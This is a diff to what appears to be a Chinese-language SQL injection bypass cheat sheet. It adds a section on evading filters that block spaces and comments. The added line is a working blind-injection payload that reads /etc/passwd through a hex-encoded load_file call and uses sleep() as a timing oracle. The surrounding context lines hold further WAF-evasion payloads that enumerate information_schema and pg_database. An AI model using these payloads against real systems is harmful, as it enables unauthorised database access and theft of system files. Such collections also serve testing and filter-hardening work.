@@ -887,6 +887,14 @@ select--\r\n* from--\r\npg_database;
  select-0-ASCII(substr(table_schema,1,1))-0e0FROM/*!information_schema.tables*/limit/**/1;
 ```
 
+#### 禁止使用空格和注释分割关键字
+
+```sql
+'or((load_file(0x2f6574632f706173737764))like'%root%'and(sleep(1)))or'lda@123.com
+```
+
+
+
 #### 可用函数和变量
 
 | 函数 / 变量          | 说明                                                         |
